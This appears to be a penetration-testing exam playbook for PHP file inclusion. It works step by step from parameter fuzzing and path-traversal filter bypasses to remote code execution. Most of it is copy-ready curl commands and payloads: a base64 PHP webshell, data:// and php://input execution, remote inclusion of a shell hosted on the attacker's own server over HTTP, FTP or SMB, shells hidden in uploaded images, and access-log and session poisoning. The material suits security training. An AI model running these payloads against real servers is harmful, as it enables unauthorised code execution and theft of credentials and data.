# NOTE — File Inclusion Pentest Methodology (Exam Playbook)

## ID
703

## Module
File Inclusion

## Kind
methodology

## Title
File Inclusion (LFI/RFI) — Full Pentest Methodology

## Description
End-to-end exam-ready playbook for File Inclusion: parameter discovery → LFI confirmation → filter bypass → source disclosure → RCE path selection (wrappers / RFI / upload chain / log poisoning) → flag retrieval. Use as a decision tree under time pressure.

## Tags
methodology, lfi, rfi, file-inclusion, php-wrappers, log-poisoning, exam, cheatsheet, decision-tree

---

## TL;DR — The 6-Phase Flow

1. **Recon** every input that controls a filename / template (`?page=`, `?language=`, `?view=`, `?file=`). Fuzz hidden params with ffuf if none visible.
2. **Confirm LFI** — push `../../../../etc/passwd` (try absolute path first, then traversal). Read the error to fingerprint the filter.
3. **Bypass** active filters — non-recursive (`....//`), URL-encoding (`%2e%2e%2f`), approved-path prefix, null byte / truncation on legacy PHP.
4. **Source-disclose** every `.php` you can find with `php://filter/read=convert.base64-encode/resource=…`. Decode and chase `include`/`require` paths.
5. **Pick an RCE path** — wrappers (`data://`, `php://input`, `expect://`) → RFI → LFI + file upload → log/session poisoning. The decision is driven by `allow_url_include`, available upload endpoints, and which logs are readable.
6. **Trigger & loot** — `cmd=ls+/`, then `cmd=cat+/<flagfile>`. Output is wrapped in HTML — strip with `grep -v "<.*>"`.

> **Golden rule:** Read the source before brute-forcing payloads. `php://filter` is free recon — pull `index.php`, `configure.php`, the upload handler. Bypass design follows from the regex you actually see, not the one you imagine.

---

## Phase 1 — Recon & LFI Confirmation

### Find the inclusion parameter
- Walk every page; look for params that control which template/page is loaded: `?page=`, `?language=`, `?view=`, `?file=`, `?lang=`, `?template=`.
- Identify back-end (PHP, NodeJS, Java, .NET) — the wrapper/RCE techniques in this playbook are **PHP-specific**. For other stacks, you mostly get arbitrary file read.
- Walk authenticated AND unauthenticated — different roles may reach different inclusion sinks.

### Hidden-parameter fuzzing (when no obvious param exists)
Two-stage ffuf — **always do a baseline run without `-fs` first**, then refilter:

```bash
# Stage 1 - parameter discovery (baseline first)
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?FUZZ=key'
# Re-run with -fs <baseline-size> to expose the real param
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?FUZZ=key' -fs <BASELINE>

# Stage 2 - LFI payload fuzzing on discovered param
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?<PARAM>=FUZZ'
ffuf -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://<IP>:<PORT>/index.php?<PARAM>=FUZZ' -fs <BASELINE>
```

`LFI-Jhaddix.txt` bundles traversal, encoded variants, and null bytes in one wordlist.

### Confirm LFI — three probes in order
```bash
# 1. Absolute path (works if no prefix/suffix)
curl -s 'http://<TARGET>/index.php?language=/etc/passwd'

# 2. Path traversal (default go-to — works whether or not a prefix exists)
curl -s 'http://<TARGET>/index.php?language=../../../../etc/passwd'

# 3. Prefix bypass — leading slash makes the prefix look like a non-existent dir
curl -s 'http://<TARGET>/index.php?language=/../../../etc/passwd'
```

Adding excessive `../` is safe — going above `/` keeps you at root. Use 5–8 to be defensive.

### Read vs Execute — set expectations
| Function | Reads | Executes | Remote URL |
|---|---|---|---|
| `include()` / `include_once()` | ✅ | ✅ | ✅ |
| `require()` / `require_once()` | ✅ | ✅ | ❌ |
| `file_get_contents()` | ✅ | ❌ | ✅ |
| `fopen()` / `file()` | ✅ | ❌ | ❌ |

If the function only **reads**, `php://filter` returns source directly without needing the base64 conversion (it would fail to "execute" anyway). RCE via wrappers requires `include`/`require`.

### Second-order LFI
Always check whether user-supplied values (username, profile fields) get stored and later used in file ops — poison at registration, fire at retrieval.

---

## Phase 2 — Filter Identification & Bypass

Probe with `../../../../etc/passwd` and read the error. Five filter families, each with a default counter:

| Filter | Detection | Bypass |
|---|---|---|
| **Non-recursive `str_replace('../','')`** | `..` strings disappear | `....//` (after strip → `../`) or `..././` |
| **Character blacklist / strict regex** | "Illegal path" or empty | URL-encode dots and slashes — `%2e%2e%2f`. **Encode dots too**, many encoders skip them |
| **Approved-path regex** (must start with `./languages/`) | "Illegal path specified" | Prefix the approved path: `./languages/../../../../etc/passwd` |
| **Single-decode blacklist** | `%2e` blocked, `%252e` survives | Double URL-encoding: `.` → `%252E`, `/` → `%252F` (decoded once during inclusion) |
| **Appended `.php` extension** (modern PHP) | Returns `.php` version of target, doesn't exist | No reliable bypass — pivot to `php://filter` (Phase 3) |
| **Appended `.php` (PHP < 5.5)** | Same | Null byte: `/etc/passwd%00` |
| **Appended `.php` (PHP < 5.3/5.4)** | Same | Path truncation — pad to 4096 chars: `non_existing/../../../etc/passwd/` + `./` × 2048 |

Stack filters: combine the approved-path prefix with the recursive bypass when both are active (`./languages/....//....//....//etc/passwd`).

---

## Phase 3 — Source Disclosure (php://filter)

Free recon when `include`/`require` is the sink. Use it before guessing payloads.

```bash
# 1. Fuzz for PHP files (catch 200, 301, 302, 403)
ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ \
  -u 'http://<TARGET>/FUZZ.php' -mc 200,301,302,403

# 2. Read source as base64 (omit .php if app auto-appends)
curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=configure'

# 3. Decode — copy from page source (browsers truncate rendered output)
echo -n '<BASE64>' | base64 -d

# 4. One-liner extract + decode
curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=index' \
  | grep -oP '[A-Za-z0-9+/=]{40,}' | base64 -d
```

### What to harvest
- DB credentials, API keys, secrets in config files.
- `include` / `require` chains → recursively read those next.
- Upload handler logic — filename scheme, target dir, validation regex.
- `urldecode()` / `str_replace()` calls → tells you the exact filter to bypass.

### Reading php.ini (for wrapper feasibility)
```bash
curl -s 'http://<TARGET>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' \
  | grep "W1BI" | sed 's/ \{12\}//g' | sed 's/<p class="read-more">//g' > configBase64.txt
cat configBase64.txt | base64 -d | grep allow_url_include
```
Path varies by PHP version + server: try `7.4/apache2`, then `8.0/apache2`, `8.1/apache2`, `8.2/apache2`, `<ver>/fpm` for Nginx.

---

## Phase 4 — RCE Path Selection

Pick by the constraints you've established:

```
allow_url_include = On    →  data:// or php://input  (cleanest)
                          →  RFI via http://<PWNIP>/shell.php  (if outbound allowed)
allow_url_include = Off   →  Log/session poisoning   (if logs readable)
                          →  LFI + file upload       (if any upload endpoint exists)
expect extension loaded   →  expect://<cmd>          (one-shot, rare)
Windows + LFI             →  SMB UNC: \\<PWNIP>\share\shell.php  (no allow_url_include needed)
```

### 4.1 PHP Wrappers — `data://` (preferred when allow_url_include=On)
```bash
# Reusable base64 webshell — works across targets
echo '<?php system($_GET["cmd"]); ?>' | base64
# → PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

# URL-encode the + and = (CRITICAL — raw + becomes space)
python3 -c 'import urllib.parse;print(urllib.parse.quote("PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg=="))'
# → PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D

# Fire
curl -s 'http://<TARGET>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"
```

### 4.2 PHP Wrappers — `php://input` (POST body)
Use when `data://` is keyword-filtered but POST is accepted:
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  'http://<TARGET>/index.php?language=php://input&cmd=id' | grep -v "<.*>"
```

### 4.3 PHP Wrappers — `expect://` (rare)
Requires the optional `expect` extension loaded at runtime:
```bash
curl -s 'http://<TARGET>/index.php?language=expect://id' | grep uid
```

### 4.4 RFI — Remote File Inclusion
Server fetches and executes a script you host. Always loopback-test first to prove RFI works without leaking your IP:

```bash
# 1. Loopback sanity check (does NOT require your IP)
curl -s 'http://<TARGET>/index.php?language=http://127.0.0.1:80/index.php'

# 2. Build and host shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80          # 80/443 are most likely whitelisted

# 3. Include + execute
curl -s 'http://<TARGET>/index.php?language=http://<PWNIP>/shell.php&cmd=ls+/' | grep -v "<.*>"

# Alternative channels
sudo python -m pyftpdlib -p 21          # FTP fallback
curl -s 'http://<TARGET>/index.php?language=ftp://<PWNIP>/shell.php&cmd=id' | grep -v "<.*>"

impacket-smbserver -smb2support share $(pwd)   # SMB — Windows targets, no allow_url_include needed
curl -s 'http://<TARGET>/index.php?language=\\<PWNIP>\share\shell.php&cmd=whoami' | grep -v "<.*>"
```

### 4.5 LFI + File Upload (no allow_url_include required)
The upload endpoint does NOT need to be vulnerable — it just needs to accept your file.

```bash
# 1. Embed PHP in a GIF (ASCII magic bytes — easiest)
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

# 2. Upload via the app's normal feature (profile pic, etc). Note path from page source.

# 3. Include
curl -s 'http://<TARGET>/index.php?language=./profile_images/shell.gif&cmd=ls+/' | grep -v "<.*>"
```

Fallback wrappers for when direct inclusion is blocked:
```bash
# zip:// — upload a .jpg-renamed zip
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
curl -s 'http://<TARGET>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id' | grep -v "<.*>"
# %23 = #, must be encoded

# phar:// — build a phar archive renamed to .jpg
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
curl -s 'http://<TARGET>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id' | grep -v "<.*>"
# %2F = /
```

### 4.6 Log / Session Poisoning (no allow_url_include, no upload)

**Apache/Nginx access log poisoning** — single request persists for all future commands:
```bash
# 1. Confirm log readable
curl -s 'http://<TARGET>/index.php?language=/var/log/apache2/access.log'

# 2. Poison User-Agent — sticks in the log
curl -s 'http://<TARGET>/index.php' -H 'User-Agent: <?php system($_GET["cmd"]); ?>'

# 3. Include + run (no re-poison needed)
curl -s 'http://<TARGET>/index.php?language=/var/log/apache2/access.log&cmd=ls+/' | grep -v "<.*>"
```
Try Nginx first on unknown configs — Apache logs often need higher privs to read.

**PHP session poisoning** — re-poison before each command (the include overwrites the controlled field):
```bash
# 1. Get PHPSESSID
curl -s -I 'http://<TARGET>/index.php' | grep -i set-cookie

# 2. See which field mirrors your input
curl -s 'http://<TARGET>/index.php?language=/var/lib/php/sessions/sess_<SESSID>'

# 3. Poison (URL-encoded <?php system($_GET["cmd"]); ?>)
curl -s 'http://<TARGET>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E'

# 4. Execute (re-poison before each new cmd — step 3 → step 4)
curl -s 'http://<TARGET>/index.php?language=/var/lib/php/sessions/sess_<SESSID>&cmd=pwd' | grep -v "<.*>"
```

**Other poisonable sources:**

| File | Vector |
|---|---|
| `/var/log/apache2/access.log` | `User-Agent` |
| `/var/log/nginx/access.log` | `User-Agent` |
| `/var/lib/php/sessions/sess_<ID>` | Controlled GET param (server-stored) |
| `/var/log/sshd.log` | SSH login username |
| `/var/log/mail` | Email sender/body |
| `/var/log/vsftpd.log` | FTP login username |
| `/proc/self/environ` | `User-Agent` (fallback when logs locked) |
| `/proc/self/fd/<N>` (N=0–50) | Same as above |

---

## Phase 5 — Trigger & Post-Exploitation

```bash
# Confirm shell is live
?cmd=id     # uid=33(www-data) ...

# Map root, then read the flag
?cmd=ls+/
?cmd=cat+/<flagfile>     # often a random hash, e.g. /c85ee5...txt
?cmd=cat+/*.txt          # broad scoop when you can't see ls output

# When ls output starts with GIF8 (e.g. GIF82f40d...txt), strip the magic-bytes prefix
# real filename = 2f40d...txt
```

### Post-RCE checklist
1. `id` → context (`www-data`).
2. `ls /` → `flag.txt`, random `<hash>.txt`, `root.txt`.
3. `cat /etc/passwd` → users for credential reuse.
4. Re-read app source files now that `cmd=` is available — DB creds, deeper auth bypass.
5. `hostname && uname -a` → environment context for privesc handoff.

---

## Decision Tree (Under Exam Pressure)

```
Inclusion-style param identified (?page= ?language= ?view= ?file=)
│
├── No obvious param? → ffuf burp-parameter-names.txt (baseline, then -fs)
│
├── Try /etc/passwd:  /etc/passwd → ../../../../etc/passwd → /../../../etc/passwd
│   ├── Works → LFI confirmed, continue
│   └── Blocked → Phase 2 — fingerprint the filter, pick bypass
│       ├── "..." stripped silently         → ....// or ..././
│       ├── "Illegal path"                  → URL-encode (%2e%2e%2f), encode dots too
│       ├── "Illegal path" + approved dir   → ./languages/../../../../etc/passwd
│       ├── Single-decode blacklist         → double URL-encode (%252e %252f)
│       └── .php appended → no bypass      → pivot to php://filter (read-only) or PHP wrappers (RCE)
│
├── Need source code?
│   └── php://filter/read=convert.base64-encode/resource=<file>
│       └── Decode → harvest creds, find upload handler, read php.ini
│
└── Need RCE?
    │
    ├── Read php.ini — is allow_url_include = On?
    │   ├── YES
    │   │   ├── data://text/plain;base64,<urlenc-b64-shell>&cmd=…
    │   │   ├── php://input  (POST body holds shell, GET holds cmd)
    │   │   └── RFI via http://<PWNIP>/shell.php  (loopback-test first)
    │   └── NO  → continue
    │
    ├── Upload endpoint exists?
    │   └── shell.gif (GIF8 + <?php …?>) → ?language=./uploads/shell.gif&cmd=…
    │       Fallback: zip:// (%23) or phar:// (%2F)
    │
    ├── Logs readable via LFI?
    │   ├── access.log → poison User-Agent (one-shot, persists)
    │   └── sess_<ID>  → poison controlled field (re-poison per cmd)
    │
    ├── Windows target? → SMB UNC \\<PWNIP>\share\shell.php  (no allow_url_include)
    │
    └── /proc/self/environ readable? → User-Agent webshell, include /proc/self/environ
```

---

## Filter / Signal → Bypass Reference

| Signal observed | Likely cause | Counter-move |
|---|---|---|
| `../../../etc/passwd` returns same page, no error | Filter strips `../` non-recursively | `....//` or `..././` |
| "Illegal path specified" on `../` | Approved-path regex enforces a prefix | `./<approved>/../../../etc/passwd` |
| Encoded `%2e%2e%2f` blocked too | Filter decodes once before checking | Double-encode: `%252e%252e%252f` |
| Page returns target as `<file>.php` (404) | App appends `.php` | `php://filter/...resource=<file>` (no extension) |
| `php://filter` returns nothing | Sink is `file_get_contents` not `include` | Just request the file directly — execution doesn't happen anyway |
| `allow_url_include` = Off | Modern default | Skip data://, RFI; pivot to upload chain or log poisoning |
| `data://...&cmd=id` returns blank | `+` / `=` not URL-encoded | URL-encode: `+`→`%2B`, `=`→`%3D` |
| RFI test against your IP times out | Egress firewall | Try port 80/443 first; loopback-test (`http://127.0.0.1`) confirms wrapper works |
| Python http.server logs `GET /shell.php.php` | App auto-appends `.php` to RFI URL too | Drop the extension from your request URL |
| `ls /` shows `GIF82f40d…txt` | `GIF8` magic-bytes prefix bleeding into output | Real filename starts after `GIF8` (e.g. `2f40d…txt`) |
| Empty `<p></p>` after RCE-looking request | Include succeeded but `cmd=` missing | Add `&cmd=id` — encoding is probably fine |
| Uploaded file 404s when included | App renamed it (UUID / md5 of contents) | Read upload handler source via php://filter; recompute hash locally with `md5sum` |
| Session file `cmd=` returns webshell-as-string instead of executing | `selected_language` field overwritten by include path | Re-poison before EACH command |
| `php://filter` base64 decode fails | Output split across HTML, base64 padding broken | Pipe through `tr -d '\n'` before decoding; copy from page source not rendered |
| Long php.ini base64 truncates in browser | HTML "read more" / pagination | Save to file: `grep "W1BI" \| sed 's/<p class="read-more">//g' > out.txt` |
| Log poisoning: command runs once then silently dies | Log rotation / busy server overwriting | Re-poison; on busy logs, use sessions instead |

---

## Master Cheatsheet — One-Liners by Scenario

```bash
# === Scenario 0: Param discovery ===
ffuf -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<T>/index.php?FUZZ=key' -fs <BASELINE>

# === Scenario 1: Confirm LFI ===
curl -s 'http://<T>/index.php?language=../../../../etc/passwd'

# === Scenario 2: Non-recursive bypass ===
curl -s 'http://<T>/index.php?language=languages/....//....//....//....//flag.txt'

# === Scenario 3: URL-encoding bypass ===
curl -s 'http://<T>/index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64'

# === Scenario 4: Approved-path + non-recursive combo ===
curl -s 'http://<T>/index.php?language=./languages/....//....//....//etc/passwd'

# === Scenario 5: Source code disclosure ===
curl -s 'http://<T>/index.php?language=php://filter/read=convert.base64-encode/resource=configure' \
  | grep -oP '[A-Za-z0-9+/=]{40,}' | base64 -d

# === Scenario 6: php.ini read (allow_url_include check) ===
curl -s 'http://<T>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini' \
  | grep "W1BI" | sed 's/ \{12\}//g' | sed 's/<p class="read-more">//g' | base64 -d | grep allow_url_include

# === Scenario 7: data:// RCE ===
curl -s 'http://<T>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=ls+/' | grep -v "<.*>"

# === Scenario 8: php://input RCE ===
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  'http://<T>/index.php?language=php://input&cmd=id' | grep -v "<.*>"

# === Scenario 9: RFI via HTTP ===
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sudo python3 -m http.server 80
curl -s 'http://<T>/index.php?language=http://<PWNIP>/shell.php&cmd=ls+/' | grep -v "<.*>"

# === Scenario 10: Upload + LFI chain ===
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# upload via app, then:
curl -s 'http://<T>/index.php?language=./profile_images/shell.gif&cmd=cat+/flag.txt' | grep -v "<.*>"

# === Scenario 11: Apache log poisoning ===
curl -s 'http://<T>/index.php' -H 'User-Agent: <?php system($_GET["cmd"]); ?>'
curl -s 'http://<T>/index.php?language=/var/log/apache2/access.log&cmd=ls+/' | grep -v "<.*>"

# === Scenario 12: PHP session poisoning ===
curl -s 'http://<T>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E'
curl -s 'http://<T>/index.php?language=/var/lib/php/sessions/sess_<SESSID>&cmd=pwd' | grep -v "<.*>"

# === Scenario 13: Skills assessment — double URL-encode + md5 upload ===
echo '<?php system($_GET["cmd"]); ?>' > shell.php && md5sum shell.php
# upload via apply.php, then:
curl 'http://<T>/contact.php?region=%252E%252E%252Fuploads%252F<MD5>&cmd=cat+/*.txt'
```

---

## Top Gotchas (Things That Will Burn You)

1. **Single-param ffuf with no `-fs` is useless** — every response is "200, baseline size". Always do a baseline run, copy the size, re-run with `-fs <SIZE>`. Each fuzzing stage produces its own baseline (param-discovery ≠ payload-fuzzing).
2. **URL-encoding has to encode the dots** — many encoders skip them. `../` → `%2e%2e%2f`, not `..%2f`. If the filter strips `..`, partial encoding still fails.
3. **Single decode + `urldecode()` in source** = double-encoding bypasses the blacklist. Saw `%2E` blocked? Try `%252E`. Saw the source call `urldecode()` once? Definitely double-encode.
4. **Forgetting `&cmd=…` in the trigger request** wastes 30 minutes debugging encoding. Empty `<p></p>` ≠ exploit failed — it means the include succeeded but you didn't pass a command. Add `&cmd=id` first.
5. **`+` and `=` in base64 break in URLs.** The reusable shell `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==` MUST become `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D`. Raw `+` is interpreted as space.
6. **php.ini path varies** — try `/etc/php/7.4/apache2/php.ini` first; if blank, walk versions (`8.0`, `8.1`, `8.2`) and switch to `fpm` for Nginx.
7. **php.ini base64 is huge** — don't manually copy. Use the `grep "W1BI" | sed | sed > file.txt` pipeline. The `<p class="read-more">` HTML tag splits the blob; the second `sed` removes it.
8. **`grep -v "<.*>"` strips RCE output sometimes** — if your command's output naturally contains `<` or `>`, this filter eats it. Re-run without grep when output looks empty.
9. **`include()` executes whatever loads — extension is irrelevant.** A file uploaded as `shell.gif` (or with a hash and no extension) still runs as PHP. Don't add `.php` to the include path manually if the server didn't store it that way.
10. **`md5_file()` hashes contents, not filename.** The local `md5sum shell.php` matches server-side only if the file content is byte-for-byte identical (including trailing newline from `echo`).
11. **`GIF82f40d…txt` filename in `ls`** — the `GIF8` is your magic-byte prefix bleeding into output. Real filename starts after it.
12. **Loopback test before exposing your IP for RFI.** `?language=http://127.0.0.1:80/index.php` proves the wrapper works. If it fails, your IP won't fix it.
13. **RFI: don't include the vulnerable page itself** — `?language=http://<PWNIP>/index.php` recurses and can DoS the target.
14. **RFI with port 80/443** — far less likely to be egress-blocked than random high ports. Switch ports if shell.php fetches time out.
15. **SMB RFI is the only Windows path that doesn't need `allow_url_include`** — but it usually only works on internal networks; over the internet it's blocked.
16. **Session poisoning re-poisons on every command.** Including the session file overwrites the controlled field with the file path itself. Step 3 (poison) → Step 4 (execute) every iteration.
17. **Session poisoning has a race condition under curl chaining** — the second request can clobber the webshell before it executes. Use the browser (two tabs) when chained curls flake.
18. **Log poisoning persists** — one User-Agent injection sticks for all future includes. But on busy servers, the log rotates or fills with noise; re-poison if the shell stops responding.
19. **`access.log` is large** — reading it on a busy server is slow and can crash it. Be efficient.
20. **`zip://` needs `%23` for `#`, `phar://` needs `%2F` for `/`** in the inclusion URL.
21. **Frontend upload validation ≠ backend storage path.** Always inspect the page source (or upload handler source via php://filter) to learn the real saved path/filename.
22. **Burp HTTP History hides image requests by default** — for skills-assessment style chains where the LFI is in `/api/image.php`, enable Images under MIME type filter or you'll never see it.
23. **CLI php.ini ≠ Apache php.ini** when hardening (defender side). `find / -name php.ini` returns both — Apache one is the real lever for web hardening, CLI changes do nothing for HTTP requests.
24. **`disable_functions` only blocks PHP-land.** If the app spawns processes via ImageMagick or external binaries, that block is moot — keep looking.
25. **Path-traversal depth math** — `/var/www/html/` = 3 levels. Use 6–8 `../` to be safe; going above `/` is harmless.
26. **Windows uses `..\`** but `../` traversal generally also works — test both.
27. **DOM/JS frameworks (.NET, Node, Java) — wrappers don't apply.** You usually only get arbitrary file read, not RCE. Source disclosure is still high-value.

---

## Reference Wordlists & Resources

| Use case | Resource |
|---|---|
| Hidden parameter discovery | `/usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt` |
| LFI payload fuzzing | `/usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt` |
| Directory/file fuzzing | `/opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt` |
| Reusable base64 webshell (URL-encoded) | `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D` |
| File-inclusion payload encyclopedia | `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion` |
| Hosting webshell | `sudo python3 -m http.server 80` / `sudo python -m pyftpdlib -p 21` / `impacket-smbserver` |

---

## Related Vault Notes

- `01-intro-to-file-inclusion.md` — theory, vulnerable patterns across PHP/Node/Java/.NET, read-vs-execute table
- `02-lfi-basics.md` — direct path, traversal, prefix bypass, second-order LFI
- `03-basic-bypasses.md` — non-recursive, URL-encoding, approved-path, null byte, path truncation
- `04-php-filters.md` — `php://filter` source disclosure, `convert.base64-encode`
- `05-php-wrappers.md` — `data://`, `php://input`, `expect://` for RCE
- `06-rfi.md` — HTTP/FTP/SMB delivery, loopback testing, allow_url_include
- `07-lfi-and-file-uploads.md` — GIF magic-bytes, `zip://`, `phar://` fallbacks
- `08-log-poisoning.md` — Apache/Nginx access log + PHP session poisoning, `/proc/self/environ`
- `09-automated-scanning.md` — two-stage ffuf (param discovery → LFI fuzzing)
- `10-prevention.md` — defender's view: `disable_functions`, `open_basedir`, allow_url_include=Off
- `skills-assessment.md` — full chain: LFI → source disclosure → upload → md5 prediction → double URL-encode → RCE
